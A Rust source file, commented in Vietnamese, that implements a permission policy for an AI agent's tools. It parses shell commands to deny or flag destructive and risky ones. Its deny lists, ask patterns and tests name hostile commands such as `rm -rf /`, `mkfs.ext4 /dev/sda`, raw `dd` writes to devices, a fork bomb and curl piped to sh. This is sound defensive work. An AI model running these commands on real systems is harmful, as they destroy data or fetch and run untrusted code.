//! Permission pipeline: quyết định tool nào được chạy, tool nào cần người dùng duyệt.
//!
//! Thứ tự ba cổng giống mô hình harness của Claude Code:
//! 1. **Deny** — lệnh phá hủy bị chặn thẳng, không hỏi.
//! 2. **Ask** — lệnh có rủi ro cần người dùng xác nhận.
//! 3. **Allow** — phần còn lại chạy trực tiếp.
//!
//! Workspace tools đã tự chặn đường dẫn ngoài workspace; lớp này bổ sung
//! chính sách cho `run_command` và các tool có tác dụng phụ.

use std::collections::HashSet;
use std::sync::atomic::{AtomicU64, Ordering};

use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use serde_json::Value;

static NEXT_APPROVAL_ID: AtomicU64 = AtomicU64::new(1);

/// Mức độ chặt của permission pipeline.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum PermissionMode {
    /// Chỉ đọc: mọi tool ghi/chạy lệnh đều bị từ chối.
    ReadOnly,
    /// Hỏi trước mọi thao tác ghi file hoặc chạy lệnh.
    Strict,
    /// Hỏi với lệnh rủi ro, cho qua thao tác thường. Mặc định.
    #[default]
    Standard,
    /// Chỉ chặn deny-list; không hỏi.
    Trust,
}

impl PermissionMode {
    pub fn parse(value: &str) -> Self {
        match value.trim().to_lowercase().as_str() {
            "readonly" | "read_only" | "read-only" => Self::ReadOnly,
            "strict" => Self::Strict,
            "trust" | "trusted" => Self::Trust,
            _ => Self::Standard,
        }
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Self::ReadOnly => "read_only",
            Self::Strict => "strict",
            Self::Standard => "standard",
            Self::Trust => "trust",
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            Self::ReadOnly => "Chỉ đọc",
            Self::Strict => "Nghiêm ngặt",
            Self::Standard => "Tiêu chuẩn",
            Self::Trust => "Tin cậy",
        }
    }

    pub fn description(self) -> &'static str {
        match self {
            Self::ReadOnly => "Chặn mọi thao tác ghi file và chạy lệnh.",
            Self::Strict => "Hỏi trước mỗi lần ghi file hoặc chạy lệnh.",
            Self::Standard => "Hỏi với lệnh rủi ro, cho qua thao tác thường.",
            Self::Trust => "Chỉ chặn lệnh phá hủy rõ ràng, không hỏi.",
        }
    }
}

/// Hành động của một rule do người dùng cấu hình.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuleAction {
    Allow,
    Ask,
    Deny,
}

/// Một rule áp cho tool + đối tượng (đường dẫn hoặc lệnh).
///
/// `tool` nhận `*` hoặc tên chính xác. `pattern` là glob khớp path với tool
/// file, khớp command với `run_command`; rỗng hoặc `*` nghĩa là mọi đối tượng.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PermissionRule {
    pub action: RuleAction,
    pub tool: String,
    #[serde(default)]
    pub pattern: String,
}

impl PermissionRule {
    pub fn new(action: RuleAction, tool: impl Into<String>, pattern: impl Into<String>) -> Self {
        Self {
            action,
            tool: tool.into(),
            pattern: pattern.into(),
        }
    }

    fn matches(&self, tool: &str, target: &str) -> bool {
        if self.tool != "*" && self.tool != tool {
            return false;
        }
        let pattern = self.pattern.trim();
        if pattern.is_empty() || pattern == "*" {
            return true;
        }
        if target.is_empty() {
            return false;
        }

        if tool == "run_command" {
            let Ok(glob) = glob::Pattern::new(pattern) else {
                return false;
            };
            // Một rule cho lệnh phải khớp từng mảnh lệnh, không để `*` nuốt
            // qua `;`, `&&`, `||`, `|` hay `$(...)` rồi cho qua cả lệnh thứ hai.
            let segments = command_segments(target);
            if segments.is_empty() {
                return glob.matches(target);
            }
            return match self.action {
                RuleAction::Allow => segments.iter().all(|segment| glob.matches(segment)),
                RuleAction::Ask | RuleAction::Deny => {
                    segments.iter().any(|segment| glob.matches(segment)) || glob.matches(target)
                }
            };
        }

        let pattern = normalize_glob_pattern(pattern);
        let Ok(glob) = glob::Pattern::new(&pattern) else {
            return false;
        };
        glob.matches(&normalize_path_target(target))
    }
}

/// Kết quả đánh giá một tool call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PermissionDecision {
    Allow,
    Ask { reason: String },
    Deny { reason: String },
}

impl PermissionDecision {
    pub fn is_allowed(&self) -> bool {
        matches!(self, Self::Allow)
    }
}

/// Yêu cầu người dùng duyệt một tool call.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApprovalRequest {
    pub id: String,
    pub tool: String,
    pub args: Value,
    pub reason: String,
    pub session_id: Option<String>,
    /// Diff hoặc mô tả thay đổi do lớp UI chuẩn bị (không bắt buộc).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub preview: Option<String>,
}

impl ApprovalRequest {
    pub fn new(
        tool: impl Into<String>,
        args: Value,
        reason: impl Into<String>,
        session_id: Option<String>,
    ) -> Self {
        Self {
            id: format!(
                "approval-{}",
                NEXT_APPROVAL_ID.fetch_add(1, Ordering::Relaxed)
            ),
            tool: tool.into(),
            args,
            reason: reason.into(),
            session_id,
            preview: None,
        }
    }

    pub fn with_preview(mut self, preview: Option<String>) -> Self {
        self.preview = preview;
        self
    }
}

/// Bộ duyệt tool call. Desktop dùng dialog + channel; CLI dùng terminal.
#[async_trait]
pub trait Approver: Send + Sync {
    async fn approve(&self, request: &ApprovalRequest) -> bool;
}

/// Luôn cho phép. Dùng cho chế độ `trust` và test.
pub struct AutoApprover;

#[async_trait]
impl Approver for AutoApprover {
    async fn approve(&self, _request: &ApprovalRequest) -> bool {
        true
    }
}

/// Luôn từ chối. Dùng khi không có kênh tương tác.
pub struct DenyApprover;

#[async_trait]
impl Approver for DenyApprover {
    async fn approve(&self, _request: &ApprovalRequest) -> bool {
        false
    }
}

/// Chính sách permission, độc lập với UI.
#[derive(Debug, Clone)]
pub struct PermissionPolicy {
    mode: PermissionMode,
    rules: Vec<PermissionRule>,
    read_only_tools: HashSet<String>,
}

impl Default for PermissionPolicy {
    fn default() -> Self {
        Self::new(PermissionMode::Standard)
    }
}

impl PermissionPolicy {
    pub fn new(mode: PermissionMode) -> Self {
        Self {
            mode,
            rules: Vec::new(),
            read_only_tools: HashSet::new(),
        }
    }

    /// Gắn rule người dùng. Rule không bao giờ vượt qua deny-list lệnh phá hủy.
    pub fn with_rules(mut self, rules: Vec<PermissionRule>) -> Self {
        self.rules = rules;
        self
    }

    /// Các tool MCP được server khai báo chỉ đọc. Chúng được phép ngay cả
    /// trong chế độ ReadOnly, nhưng vẫn chịu deny-list và rule deny của người dùng.
    pub fn with_read_only_tools(mut self, tools: Vec<String>) -> Self {
        self.read_only_tools = tools.into_iter().collect();
        self
    }

    pub fn read_only_tools(&self) -> &HashSet<String> {
        &self.read_only_tools
    }

    pub fn mode(&self) -> PermissionMode {
        self.mode
    }

    pub fn rules(&self) -> &[PermissionRule] {
        &self.rules
    }

    /// Ba cổng: deny → ask → allow, với rule người dùng chen giữa.
    pub fn evaluate(&self, tool: &str, args: &Value) -> PermissionDecision {
        if let Some(reason) = deny_reason(tool, args) {
            return PermissionDecision::Deny { reason };
        }

        let target = rule_target(tool, args);
        if let Some(rule) = self
            .rules
            .iter()
            .find(|rule| rule.action == RuleAction::Deny && rule.matches(tool, &target))
        {
            return PermissionDecision::Deny {
                reason: format!("rule deny: {} {}", rule.tool, rule.pattern)
                    .trim()
                    .to_string(),
            };
        }

        if self.read_only_tools.contains(tool) {
            return PermissionDecision::Allow;
        }

        if self.mode == PermissionMode::ReadOnly && is_mutating(tool) {
            return PermissionDecision::Deny {
                reason: "chế độ chỉ đọc: không cho phép ghi file hoặc chạy lệnh".to_string(),
            };
        }

        let read_only_mcp = self.mode != PermissionMode::ReadOnly
            && tool.starts_with("mcp__")
            && self.read_only_tools.contains(tool);

        if self
            .rules
            .iter()
            .any(|rule| rule.action == RuleAction::Allow && rule.matches(tool, &target))
        {
            return PermissionDecision::Allow;
        }

        // Hint chỉ bỏ câu hỏi chung "tool từ MCP server bên ngoài"; rule ask
        // của người dùng vẫn được ưu tiên.
        if !read_only_mcp {
            if let Some(reason) = ask_reason(tool, args) {
                return match self.mode {
                    PermissionMode::Trust => PermissionDecision::Allow,
                    _ => PermissionDecision::Ask { reason },
                };
            }
        }

        if let Some(rule) = self
            .rules
            .iter()
            .find(|rule| rule.action == RuleAction::Ask && rule.matches(tool, &target))
        {
            return PermissionDecision::Ask {
                reason: format!("rule ask: {} {}", rule.tool, rule.pattern)
                    .trim()
                    .to_string(),
            };
        }

        if read_only_mcp {
            return PermissionDecision::Allow;
        }

        if self.mode == PermissionMode::Strict && is_mutating(tool) {
            return PermissionDecision::Ask {
                reason: "chế độ nghiêm ngặt: cần duyệt mọi thay đổi".to_string(),
            };
        }

        PermissionDecision::Allow
    }
}

/// Đối tượng mà rule so khớp: path với tool file, command với `run_command`.
fn rule_target(tool: &str, args: &Value) -> String {
    if tool == "run_command" {
        return args
            .get("command")
            .and_then(Value::as_str)
            .unwrap_or_default()
            .to_string();
    }
    args.get("path")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_string()
}

fn is_mutating(tool: &str) -> bool {
    matches!(
        tool,
        "write_file" | "edit_file" | "run_command" | "memory_save" | "memory_forget"
    ) || tool.starts_with("mcp__")
}

/// Chuẩn hóa lệnh để so khớp: bỏ quote, gộp khoảng trắng, lowercase.
fn normalize(command: &str) -> String {
    let cleaned: String = command
        .chars()
        .filter(|ch| *ch != '"' && *ch != '\'')
        .collect();
    cleaned
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase()
}

/// Một mảnh lệnh đơn giản, đã tách quote/escape và dừng ở toán tử shell.
#[derive(Debug, Clone, Default)]
struct CommandSegment {
    words: Vec<String>,
    /// Lệnh lồng quá sâu để phân tích an toàn (bị chặn thẳng).
    too_deep: bool,
}

const MAX_SHELL_DEPTH: usize = 16;
const DELETE_COMMANDS: &[&str] = &["rm", "rmdir", "del", "erase", "rd", "srm", "shred"];
const SHELL_COMMANDS: &[&str] = &["sh", "bash", "zsh", "dash", "ash", "ksh", "fish"];

fn parse_command_segments(command: &str) -> Vec<CommandSegment> {
    parse_command_segments_at(command, 0)
}

fn parse_command_segments_at(command: &str, depth: usize) -> Vec<CommandSegment> {
    if depth > MAX_SHELL_DEPTH {
        return vec![CommandSegment {
            words: Vec::new(),
            too_deep: true,
        }];
    }

    let mut segments = Vec::new();
    let expanded = expand_command_substitutions(command, depth, &mut segments);
    segments.extend(lex_segments(&expanded));

    let mut result = Vec::new();
    for segment in segments {
        // `bash -c '...'`, `sh -ec "..."`, `eval ...`, `su -c '...'`.
        if let Some(script) = shell_script(&segment) {
            result.extend(parse_command_segments_at(&script, depth + 1));
        }
        result.push(segment);
    }
    result
}

/// Tách `$(...)` và `` `...` `` thành lệnh riêng trước khi lex, kể cả trong
/// double quote. Single quote là literal nên không thực thi.
fn expand_command_substitutions(
    command: &str,
    depth: usize,
    segments: &mut Vec<CommandSegment>,
) -> String {
    let chars: Vec<char> = command.chars().collect();
    let mut result = String::with_capacity(command.len());
    let mut index = 0;
    let mut single = false;
    let mut double = false;

    while index < chars.len() {
        let ch = chars[index];
        if single {
            result.push(ch);
            if ch == '\'' {
                single = false;
            }
            index += 1;
            continue;
        }
        if ch == '\\' && index + 1 < chars.len() {
            result.push(ch);
            result.push(chars[index + 1]);
            index += 2;
            continue;
        }
        if ch == '\'' && !double {
            single = true;
            result.push(ch);
            index += 1;
            continue;
        }
        if ch == '"' {
            double = !double;
            result.push(ch);
            index += 1;
            continue;
        }
        if ch == '$' && chars.get(index + 1) == Some(&'(') {
            let (inner, next) = extract_balanced(&chars, index + 2, '(', ')');
            segments.extend(parse_command_segments_at(&inner, depth + 1));
            result.push(' ');
            index = next;
            continue;
        }
        if ch == '`' {
            let (inner, next) = extract_until(&chars, index + 1, '`');
            segments.extend(parse_command_segments_at(&inner, depth + 1));
            result.push(' ');
            index = next;
            continue;
        }
        result.push(ch);
        index += 1;
    }
    result
}

fn extract_balanced(chars: &[char], start: usize, open: char, close: char) -> (String, usize) {
    let mut depth = 1usize;
    let mut index = start;
    let mut inner = String::new();
    let mut single = false;
    let mut double = false;

    while index < chars.len() {
        let ch = chars[index];
        if single {
            inner.push(ch);
            if ch == '\'' {
                single = false;
            }
            index += 1;
            continue;
        }
        if ch == '\\' && index + 1 < chars.len() {
            inner.push(ch);
            inner.push(chars[index + 1]);
            index += 2;
            continue;
        }
        if ch == '\'' && !double {
            single = true;
            inner.push(ch);
            index += 1;
            continue;
        }
        if ch == '"' {
            double = !double;
            inner.push(ch);
            index += 1;
            continue;
        }
        if ch == open {
            depth += 1;
            inner.push(ch);
        } else if ch == close {
            depth -= 1;
            if depth == 0 {
                return (inner, index + 1);
            }
            inner.push(ch);
        } else {
            inner.push(ch);
        }
        index += 1;
    }
    (inner, index)
}

fn extract_until(chars: &[char], start: usize, end: char) -> (String, usize) {
    let mut inner = String::new();
    let mut index = start;
    while index < chars.len() {
        let ch = chars[index];
        if ch == '\\' && index + 1 < chars.len() {
            inner.push(ch);
            inner.push(chars[index + 1]);
            index += 2;
            continue;
        }
        if ch == end {
            return (inner, index + 1);
        }
        inner.push(ch);
        index += 1;
    }
    (inner, index)
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Quote {
    None,
    Single,
    Double,
}

/// Lex một chuỗi thành các mảnh lệnh, giữ ranh giới `;`, `&&`, `||`, `|`,
/// `(`, `)`, `{`, `}`, backtick và newline.
fn lex_segments(input: &str) -> Vec<CommandSegment> {
    let chars: Vec<char> = input.chars().collect();
    let mut segments = Vec::new();
    let mut words = Vec::new();
    let mut current = String::new();
    let mut quote = Quote::None;
    let mut index = 0;

    while index < chars.len() {
        let ch = chars[index];
        match quote {
            Quote::Single => {
                if ch == '\'' {
                    quote = Quote::None;
                } else {
                    current.push(ch);
                }
                index += 1;
            }
            Quote::Double => match ch {
                '"' => {
                    quote = Quote::None;
                    index += 1;
                }
                '\\' if index + 1 < chars.len() => {
                    current.push(chars[index + 1]);
                    index += 2;
                }
                '$' if chars.get(index + 1) == Some(&'{') => {
                    index = consume_braced_variable(&chars, index, &mut current);
                }
                _ => {
                    current.push(ch);
                    index += 1;
                }
            },
            Quote::None => match ch {
                '\'' => {
                    quote = Quote::Single;
                    index += 1;
                }
                '"' => {
                    quote = Quote::Double;
                    index += 1;
                }
                '\\' if index + 1 < chars.len() => {
                    current.push(chars[index + 1]);
                    index += 2;
                }
                '\\' => index += 1,
                '$' if chars.get(index + 1) == Some(&'{') => {
                    index = consume_braced_variable(&chars, index, &mut current);
                }
                // `$'...'` (ANSI-C) và `$"..."`: bỏ `$` để quote điều khiển
                // việc tách từ, không để `$rm` che mất tên lệnh.
                '$' if matches!(chars.get(index + 1).copied(), Some('\'') | Some('"')) => {
                    index += 1;
                }
                '\n' | '\r' => {
                    finish_word(&mut words, &mut current);
                    finish_segment(&mut segments, &mut words);
                    index += 1;
                }
                ch if ch.is_whitespace() => {
                    finish_word(&mut words, &mut current);
                    index += 1;
                }
                ';' => {
                    finish_word(&mut words, &mut current);
                    finish_segment(&mut segments, &mut words);
                    index += 1;
                }
                '&' => {
                    finish_word(&mut words, &mut current);
                    finish_segment(&mut segments, &mut words);
                    index += if chars.get(index + 1) == Some(&'&') {
                        2
                    } else {
                        1
                    };
                }
                '|' => {
                    finish_word(&mut words, &mut current);
                    finish_segment(&mut segments, &mut words);
                    index += if matches!(chars.get(index + 1).copied(), Some('|') | Some('&')) {
                        2
                    } else {
                        1
                    };
                }
                '(' | ')' | '{' | '}' | '`' => {
                    finish_word(&mut words, &mut current);
                    finish_segment(&mut segments, &mut words);
                    index += 1;
                }
                '>' | '<' => {
                    finish_word(&mut words, &mut current);
                    let mut operator = String::new();
                    while index < chars.len() && matches!(chars[index], '>' | '<') {
                        operator.push(chars[index]);
                        index += 1;
                    }
                    if chars.get(index) == Some(&'&') {
                        operator.push('&');
                        index += 1;
                    }
                    words.push(operator);
                }
                '#' if current.is_empty() => {
                    while index < chars.len() && chars[index] != '\n' {
                        index += 1;
                    }
                }
                _ => {
                    current.push(ch);
                    index += 1;
                }
            },
        }
    }

    finish_word(&mut words, &mut current);
    finish_segment(&mut segments, &mut words);
    segments
}

fn consume_braced_variable(chars: &[char], start: usize, current: &mut String) -> usize {
    let mut index = start;
    current.push('$');
    current.push('{');
    index += 2;
    while index < chars.len() {
        let ch = chars[index];
        current.push(ch);
        index += 1;
        if ch == '}' {
            break;
        }
    }
    index
}

fn finish_word(words: &mut Vec<String>, current: &mut String) {
    if !current.is_empty() {
        let word = std::mem::take(current);
        // Giữ nguyên case của flag (`-S` khác `-s`); phần còn lại hạ case để
        // bắt được `RM`, `RMDIR`, `$HOME`...
        if word.starts_with('-') {
            words.push(word);
        } else {
            words.push(word.to_lowercase());
        }
    }
}

fn finish_segment(segments: &mut Vec<CommandSegment>, words: &mut Vec<String>) {
    if !words.is_empty() {
        segments.push(CommandSegment {
            words: std::mem::take(words),
            too_deep: false,
        });
    }
}

fn command_name(token: &str) -> &str {
    let name = token.rsplit(['/', '\\']).next().unwrap_or(token);
    name.strip_suffix(".exe").unwrap_or(name)
}

fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name
            .chars()
            .next()
            .is_some_and(|ch| ch.is_ascii_alphabetic() || ch == '_')
        && name
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
}

fn skip_options(words: &[String], mut index: usize, value_options: &[&str]) -> usize {
    while index < words.len() {
        let word = &words[index];
        if word == "--" {
            return index + 1;
        }
        if !word.starts_with('-') || word == "-" {
            break;
        }
        let takes_value = value_options.iter().any(|option| word == *option);
        index += 1;
        if takes_value && index < words.len() {
            index += 1;
        }
    }
    index
}

/// Vị trí của lệnh thực sự trong mảnh: bỏ qua assignment và wrapper như
/// `sudo -u root`, `timeout 5`, `env FOO=1`, `xargs -0`, `nice -n 5`.
fn command_index(words: &[String]) -> Option<usize> {
    let mut index = 0;
    while index < words.len() && is_assignment(&words[index]) {
        index += 1;
    }

    loop {
        let word = words.get(index)?;
        let name = command_name(word);
        match name {
            "sudo" => {
                index = skip_options(
                    words,
                    index + 1,
                    &["-u", "-g", "-p", "-C", "-r", "-t", "-U", "-T", "-D", "-R"],
                );
            }
            "doas" => index = skip_options(words, index + 1, &["-u", "-C"]),
            "env" => {
                // `env -S 'rm -rf /'` thực thi chuỗi tách được; giữ env ở
                // command position để `shell_script` parse value của nó.
                if env_split_value(words, index + 1).is_some() {
                    return Some(index);
                }
                index = skip_options(words, index + 1, &["-u", "--unset", "-C", "--chdir"]);
            }
            "timeout" => {
                index = skip_options(words, index + 1, &["-s", "--signal", "-k", "--kill-after"]);
                if index < words.len() {
                    index += 1; // duration
                }
            }
            "nice" => index = skip_options(words, index + 1, &["-n", "--adjustment"]),
            "nohup" | "exec" | "time" | "stdbuf" | "builtin" | "!" => {
                let value_options: &[&str] = match name {
                    "exec" => &["-a"],
                    "stdbuf" => &["-i", "-o", "-e"],
                    _ => &[],
                };
                index = skip_options(words, index + 1, value_options);
            }
            "command" => {
                if matches!(words.get(index + 1).map(String::as_str), Some("-v" | "-V")) {
                    return None;
                }
                index = skip_options(words, index + 1, &[]);
            }
            "xargs" => {
                index = skip_options(
                    words,
                    index + 1,
                    &["-I", "-n", "-P", "-s", "-L", "-d", "-E", "-a", "-e", "-l"],
                );
            }
            "if" | "then" | "else" | "elif" | "do" | "while" | "until" | "for" | "select"
            | "case" | "esac" | "fi" | "done" | "coproc" => {
                index += 1;
            }
            _ => return Some(index),
        }

        while index < words.len() && is_assignment(&words[index]) {
            index += 1;
        }
    }
}

fn env_split_value(words: &[String], start: usize) -> Option<String> {
    let mut index = start;
    while index < words.len() {
        let word = &words[index];
        if word == "--" {
            return None;
        }
        if word == "-S" || word == "--split-string" {
            return words.get(index + 1).cloned();
        }
        if let Some(value) = word.strip_prefix("--split-string=") {
            return Some(value.to_string());
        }
        if let Some(value) = word.strip_prefix("-S") {
            if !value.is_empty() {
                return Some(value.to_string());
            }
        }
        index += 1;
    }
    None
}

fn shell_script_flag(word: &str) -> bool {
    word == "--command"
        || (word.starts_with('-') && !word.starts_with("--") && word[1..].contains('c'))
}

fn shell_script(segment: &CommandSegment) -> Option<String> {
    let index = command_index(&segment.words)?;
    let name = command_name(&segment.words[index]);

    if name == "env" {
        return env_split_value(&segment.words, index + 1);
    }
    if name == "eval" {
        let script = segment.words[index + 1..].join(" ");
        return (!script.trim().is_empty()).then_some(script);
    }
    if !SHELL_COMMANDS.contains(&name) && name != "su" {
        return None;
    }

    let mut index = index + 1;
    while index < segment.words.len() {
        if segment.words[index] == "--" {
            return None;
        }
        if shell_script_flag(&segment.words[index]) {
            return segment.words.get(index + 1).cloned();
        }
        index += 1;
    }
    None
}

fn command_segments(command: &str) -> Vec<String> {
    parse_command_segments(command)
        .into_iter()
        .filter(|segment| !segment.words.is_empty())
        .map(|segment| segment.words.join(" "))
        .collect()
}

fn normalize_path_target(target: &str) -> String {
    let replaced = target.trim().replace('\\', "/");
    let absolute = replaced.starts_with('/');
    let mut parts: Vec<&str> = Vec::new();
    for part in replaced.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                if parts.last().is_some_and(|last| *last != "..") {
                    parts.pop();
                } else if !absolute {
                    parts.push("..");
                }
            }
            other => parts.push(other),
        }
    }
    let joined = parts.join("/");
    if absolute {
        format!("/{joined}")
    } else {
        joined
    }
}

fn normalize_glob_pattern(pattern: &str) -> String {
    let pattern = pattern.trim();
    let pattern = pattern.strip_prefix("./").unwrap_or(pattern);
    // Chỉ đổi `\` thành `/` cho đường dẫn Windows; ngoài ra `\` vẫn là
    // escape của glob (ví dụ `src/\*.rs`).
    let looks_windows = pattern.as_bytes().get(1) == Some(&b':') || pattern.starts_with("\\\\");
    if looks_windows {
        pattern.replace('\\', "/")
    } else {
        pattern.to_string()
    }
}

fn delete_command_index(segment: &CommandSegment) -> Option<usize> {
    let index = command_index(&segment.words)?;
    DELETE_COMMANDS
        .contains(&command_name(&segment.words[index]))
        .then_some(index)
}

fn flag_has(flag: &str, short: char, long: &str) -> bool {
    if flag == long {
        return true;
    }
    if flag.starts_with("--") {
        return false;
    }
    flag.strip_prefix('-')
        .is_some_and(|rest| rest.chars().any(|ch| ch.eq_ignore_ascii_case(&short)))
}

fn is_delete_flag(arg: &str, windows: bool) -> bool {
    if arg.starts_with('-') && arg.len() > 1 {
        return true;
    }
    windows
        && arg.len() == 2
        && arg.starts_with('/')
        && matches!(
            arg.as_bytes()[1],
            b's' | b'q' | b'f' | b'p' | b'a' | b'h' | b'r'
        )
}

fn split_delete_args(args: &[String], windows: bool) -> (Vec<String>, Vec<String>) {
    let mut flags = Vec::new();
    let mut targets = Vec::new();
    let mut options_done = false;
    for arg in args {
        if !options_done && arg == "--" {
            options_done = true;
            continue;
        }
        if !options_done && is_delete_flag(arg, windows) {
            flags.push(arg.clone());
        } else {
            targets.push(arg.clone());
        }
    }
    (flags, targets)
}

fn is_root_target(target: &str) -> bool {
    matches!(target, "/" | "/*" | "*" | "c:" | "c:/*")
}

/// `C:\Windows` bị lexer bỏ mất backslash thành `C:Windows`; thêm lại `/`
/// sau ổ đĩa để so sánh nhất quán.
fn normalize_windows_drive(path: &str) -> String {
    let bytes = path.as_bytes();
    if bytes.len() > 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' && bytes[2] != b'/' {
        let mut out = String::with_capacity(path.len() + 1);
        out.push_str(&path[..2]);
        out.push('/');
        out.push_str(&path[2..]);
        return out;
    }
    path.to_string()
}

fn is_catastrophic_target(target: &str) -> bool {
    let target = normalize_windows_drive(&normalize_path_target(target)).to_lowercase();
    if target.is_empty() {
        return false;
    }
    if is_root_target(&target)
        || matches!(target.as_str(), "~" | "$home" | "${home}")
        || target.starts_with("~/")
        || target.starts_with("$home/")
        || target.starts_with("${home}/")
    {
        return true;
    }
    if let Some(rest) = target.strip_prefix("c:/") {
        if matches!(
            rest,
            "windows" | "program files" | "program files (x86)" | "programdata" | "users"
        ) || [
            "windows/",
            "program files/",
            "program files (x86)/",
            "programdata/",
            "users/",
        ]
        .iter()
        .any(|prefix| rest.starts_with(prefix))
        {
            return true;
        }
    }
    [
        "/etc", "/usr", "/var", "/home", "/root", "/bin", "/boot", "/dev", "/lib", "/opt", "/sbin",
        "/srv", "/sys", "/proc",
    ]
    .iter()
    .any(|prefix| {
        target == *prefix
            || target
                .strip_prefix(prefix)
                .is_some_and(|rest| rest.starts_with('/'))
    })
}

/// `rm -rf /`, `rm -rf ~`, `rm -rf $HOME`, `rmdir /s /q C:\`... bị chặn
/// thẳng, kể cả ở Trust. Chỉ xét đối số trong cùng một mảnh lệnh.
fn catastrophic_delete(segment: &CommandSegment) -> bool {
    let Some(index) = delete_command_index(segment) else {
        return false;
    };
    let name = command_name(&segment.words[index]);
    let args = &segment.words[index + 1..];
    let windows = matches!(name, "del" | "erase" | "rd" | "rmdir");
    let (flags, targets) = split_delete_args(args, windows);

    let recursive = flags.iter().any(|flag| flag_has(flag, 'r', "--recursive"));
    let force = flags.iter().any(|flag| flag_has(flag, 'f', "--force"));
    let root_target = targets.iter().any(|target| is_catastrophic_target(target));

    if windows
        && root_target
        && flags
            .iter()
            .any(|flag| matches!(flag.as_str(), "/s" | "/q" | "/f"))
    {
        return true;
    }

    let absolute = targets
        .iter()
        .any(|target| target.starts_with('/') || target.starts_with('\\'));
    (root_target
        && (recursive
            || force
            || targets
                .iter()
                .any(|target| is_root_target(&normalize_path_target(target).to_lowercase()))))
        || (recursive && force && absolute)
}

fn redirects_to_device(segment: &CommandSegment) -> bool {
    let mut redirect = false;
    for word in &segment.words {
        if word.starts_with('>') {
            redirect = true;
            continue;
        }
        if redirect {
            if word.starts_with("/dev/sd") || word.starts_with("/dev/nvme") {
                return true;
            }
            redirect = false;
        }
    }
    false
}

fn deny_reason(tool: &str, args: &Value) -> Option<String> {
    if tool != "run_command" {
        return None;
    }
    let command = args.get("command").and_then(Value::as_str)?;
    let segments = parse_command_segments(command);

    if segments.iter().any(|segment| segment.too_deep) {
        return Some("lệnh lồng quá sâu để phân tích an toàn".to_string());
    }
    if segments.iter().any(catastrophic_delete) {
        return Some("lệnh xóa toàn bộ thư mục gốc/ổ đĩa".to_string());
    }

    for segment in &segments {
        let Some(index) = command_index(&segment.words) else {
            continue;
        };
        let name = command_name(&segment.words[index]);
        if name == "mkfs" || name.starts_with("mkfs.") {
            return Some(format!("lệnh chứa mẫu bị chặn: '{name}'"));
        }
        if matches!(name, "shutdown" | "reboot" | "poweroff" | "halt") {
            return Some(format!("lệnh chứa mẫu bị chặn: '{name}'"));
        }
        if name == "dd"
            && segment
                .words
                .iter()
                .any(|token| token.starts_with("of=/dev/"))
        {
            return Some("lệnh ghi trực tiếp lên thiết bị".to_string());
        }
        if name == "chmod"
            && segment
                .words
                .iter()
                .any(|token| token == "777" || token == "0777")
            && segment.words.iter().any(|token| token == "/")
        {
            return Some("lệnh đổi quyền toàn hệ thống".to_string());
        }
        if redirects_to_device(segment) {
            return Some("lệnh ghi trực tiếp lên thiết bị".to_string());
        }
    }

    if command.replace(' ', "").contains(":(){") {
        return Some("fork bomb".to_string());
    }
    None
}

/// Nhận diện lệnh xóa kể cả khi bị bọc: `bash -c 'rm -rf ~'`, `/bin/rm`,
/// `command rm`, `r\m`, `sudo -u root rm`.
fn destructive_command(command: &str) -> bool {
    parse_command_segments(command).iter().any(|segment| {
        let Some(index) = command_index(&segment.words) else {
            return false;
        };
        let name = command_name(&segment.words[index]);
        DELETE_COMMANDS.contains(&name)
            || (name == "find"
                && segment.words[index + 1..].iter().any(|token| {
                    matches!(
                        token.as_str(),
                        "-delete" | "-exec" | "-execdir" | "-ok" | "-okdir"
                    )
                }))
    })
}

const ASK_PATTERNS: &[&str] = &[
    "git reset --hard",
    "git clean -fd",
    "git clean -xdf",
    "git push --force",
    "git push -f",
    "git checkout --",
    "drop table",
    "truncate table",
    "chmod",
    "chown",
    "kill ",
    "pkill",
    "systemctl",
    "docker rm",
    "docker rmi",
    "docker system prune",
    "npm install",
    "npm i ",
    "pnpm add",
    "pnpm install",
    "yarn add",
    "pip install",
    "pip3 install",
    "cargo install",
    "apt install",
    "apt-get install",
    "brew install",
    "curl ",
    "wget ",
    "ssh ",
    "scp ",
    "> /etc/",
];

fn ask_reason(tool: &str, args: &Value) -> Option<String> {
    if tool == "run_command" {
        let command = args.get("command").and_then(Value::as_str)?;
        let normalized = normalize(command);
        if destructive_command(command) {
            return Some("lệnh xóa file/thư mục".to_string());
        }
        if normalized.contains("curl") && normalized.contains("| sh") {
            return Some("tải và chạy script từ internet".to_string());
        }
        for pattern in ASK_PATTERNS {
            if normalized.contains(pattern) {
                let label = pattern.trim();
                return Some(format!("lệnh có thể thay đổi hệ thống: '{label}'"));
            }
        }
        return None;
    }

    if tool == "web_fetch" {
        return Some("truy cập mạng bên ngoài".to_string());
    }

    if tool.starts_with("mcp__") {
        return Some("tool từ MCP server bên ngoài".to_string());
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn allows_routine_reads_and_writes() {
        let policy = PermissionPolicy::default();
        assert!(policy
            .evaluate("read_file", &json!({"path": "a"}))
            .is_allowed());
        assert!(policy
            .evaluate("write_file", &json!({"path": "a", "content": "x"}))
            .is_allowed());
    }

    #[test]
    fn denies_destructive_commands() {
        let policy = PermissionPolicy::default();
        for command in ["rm -rf /", "sudo rm -rf /tmp", "mkfs.ext4 /dev/sda"] {
            let decision = policy.evaluate("run_command", &json!({"command": command}));
            assert!(
                matches!(decision, PermissionDecision::Deny { .. }),
                "{command} -> {decision:?}"
            );
        }
    }

    #[test]
